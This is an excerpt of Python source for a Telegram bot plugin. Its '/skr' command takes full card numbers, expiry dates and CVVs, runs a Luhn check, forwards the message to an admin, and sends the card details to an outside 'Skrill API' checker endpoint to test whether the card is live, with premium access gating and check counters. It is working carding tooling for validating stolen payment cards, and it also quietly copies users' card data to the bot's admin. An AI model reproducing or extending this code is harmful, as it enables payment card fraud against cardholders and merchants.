...
PLUGIN_INFO = {
    ...
    'commands': ['skr'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'Skrill API payment gateway',
    'type': 'check',
    'status': 'active'
}

def categorize_skrill_response(api_response):
    """Categorize Skrill API response"""
    try:
...
def format_skrill_response(card_info, response_message, suffix, bin_info, execution_time, category):
    """Format Skrill API response for Telegram"""
    ...
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Skrill API\n"
...
class SkrillGateway:
    def __init__(self):
        self.base_url = "https://onyxenvbot.up.railway.app/skrill/key=yashikaaa/cc="

    async def check_card(self, card, month, year, cvv):
        """Main function to check card through Skrill API"""
...
def setup(app: Client):
    ...
    @app.on_message(filters.command(["skr"], prefixes=[".", "/", "!", "$"]))
    async def skr_command(client, message):
        """Handle /skr command"""
        ...
        can_access, reason = await check_gateway_access(user_id, 'skr')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
        ...
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝗦𝗸𝗿𝗶𝗹𝗹 𝗔𝗣𝗜 - CHECK

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Skrill API

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /skr cc|month|year|cvc"""
        ...
        if not await validate_card_with_luhn(card_info, "Skrill API", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'skr')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card using Skrill Gateway
        gateway = SkrillGateway()
        api_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'skr')
        ...
        if error:
            ...
            response_text = format_skrill_response(
            ...
            # Parse API response
            category, response_message, suffix = categorize_skrill_response(api_response)
    ...
    print("✅ Skrill Gateway commands registered")
